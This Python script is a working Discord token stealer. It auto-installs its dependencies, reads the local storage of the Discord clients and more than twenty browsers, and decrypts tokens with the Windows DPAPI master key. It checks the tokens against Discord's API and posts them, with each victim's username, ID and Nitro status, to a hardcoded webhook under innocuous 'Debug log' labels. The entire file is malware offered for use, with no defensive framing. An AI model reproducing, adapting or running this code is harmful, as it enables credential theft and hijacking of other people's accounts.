import sys
import subprocess

def install_and_import(package_name, import_name=None):
    """
    Attempts to import a module; if not found, installs the package using pip and then imports it.
    
    :param package_name: The pip package name.
    :param import_name: The module name to import (if different from the package name).
    """
    try:
        if import_name:
            __import__(import_name)
        else:
            __import__(package_name)
    except ImportError:
        print(f"Package '{package_name}' not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        print(f"Package '{package_name}' installed successfully.")

# Ensure dependencies are installed.
install_and_import("requests")
install_and_import("pycryptodome", "Crypto")
install_and_import("pywin32")  # Note: We'll handle importing win32crypt separately.

# Now that dependencies are installed, try importing win32crypt.
try:
    from win32crypt import CryptUnprotectData
except ModuleNotFoundError:
    print("Module 'win32crypt' not found. Running pywin32_postinstall to register modules...")
    try:
        subprocess.check_call([sys.executable, '-m', 'pywin32_postinstall', '-install'])
    except subprocess.CalledProcessError as e:
        sys.exit(f"pywin32_postinstall failed: {e}")
    try:
        from win32crypt import CryptUnprotectData
    except ModuleNotFoundError:
        sys.exit("Failed to import 'win32crypt' even after running pywin32_postinstall. Exiting.")

import base64
import json
import os
import re
import requests
import time

from Crypto.Cipher import AES

class ExtractTokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        print("Starting extraction process...")
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        total_paths = len(paths)
        path_count = 0
        
        for name, path in paths.items():
            path_count += 1
            print(f"Checking path {path_count}/{total_paths}: {name}...")
            if not os.path.exists(path): 
                print(f"Path does not exist: {path}")
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                state_path = os.path.join(self.roaming, f"{_discord}", "Local State")
                if not os.path.exists(state_path): 
                    print(f"Local State file not found for {name}")
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    file_path = os.path.join(path, file_name)
                    try:
                        with open(file_path, errors='ignore') as f:
                            lines = [x.strip() for x in f.readlines() if x.strip()]
                    except Exception as e:
                        print(f"Could not read file {file_path}: {e}")
                        continue

                    for line in lines:
                        for y in re.findall(self.regexp_enc, line):
                            try:
                                encrypted_value = base64.b64decode(y.split('dQw4w9WgXcQ:')[1])
                                master_key = self.get_master_key(state_path)
                                token = self.decrypt_val(encrypted_value, master_key)
                            except Exception as e:
                                print(f"Error decrypting token: {e}")
                                continue

                            if self.validate_token(token):
                                try:
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                except Exception as e:
                                    print(f"Error validating token: {e}")
                                    continue
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                                    print(f"Token found: {token} for user ID {uid}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    file_path = os.path.join(path, file_name)
                    try:
                        with open(file_path, errors='ignore') as f:
                            lines = [x.strip() for x in f.readlines() if x.strip()]
                    except Exception as e:
                        print(f"Could not read file {file_path}: {e}")
                        continue

                    for line in lines:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                try:
                                    uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                except Exception as e:
                                    print(f"Error validating token: {e}")
                                    continue
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                                    print(f"Token found: {token} for user ID {uid}")

    def validate_token(self, token: str) -> bool:
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except requests.exceptions.RequestException:
            return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def get_master_key(self, path: str) -> bytes:
        if not os.path.exists(path):
            return b''
        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Error getting master key from {path}: {e}")
            return b''


class FetchTokens:
    def __init__(self):
        print("Initializing token fetcher...")
        self.tokens = ExtractTokens().tokens
    
    def upload(self, webhook_url, raw_data=False):
        print("Uploading tokens...")
        if not self.tokens:
            print("No tokens found.")
            return
        final_to_return = []
        for token in self.tokens:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                username = user['username']
                user_id = user['id']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
                nitro = 'None' if user['premium_type'] == 0 else ('Nitro Classic' if user['premium_type'] == 1 else 'Nitro')
                
                # Add relevant emojis
                nitro_emoji = "🎮" if nitro != 'None' else "🚫"
                avatar_emoji = "🖼️"
                
                # Create a clean, professional message using markdown and emojis
                content = (
                    f"** Log for <@{user_id}> {username} **\n\n"
                    f"**User ID:** `{user_id}`\n"
                    f"**NS:** {nitro_emoji} {nitro}\n"
                    f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n"
                    f"**Log Number:** `{token}`\n\n"
                )

                embed = {
                    "title": f"Debug log for {username}",
                    "description": content,
                    "color": 16711680,  # Red (Discord-like color for highlights)
                    "footer": {"text": "Help Logs"}
                }

                data = {
                    'content': None,
                    'embeds': [embed],
                    'username': username,
                    'user_id': user_id,
                    'token': token,
                    'avatar': avatar,
                    'nitro': nitro
                }

                print(f"Preparing to send data: {json.dumps(data, indent=4)}")

                if not raw_data:
                    response = requests.post(webhook_url, json=data)
                    print(f"Response Status Code: {response.status_code}, Response Text: {response.text}")

                final_to_return.append(data)
            except Exception as e:
                print(f"Error processing token: {e}")
        
        return final_to_return


if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1320922615602221097/lpXbNg22dAgmT4VvGAFnfS8TTDrPKKesxKf4zJE_vSmUXNljWNhxMG1dAjyVyVK6wQl5"
    fetcher = FetchTokens()
    fetcher.upload(webhook_url)
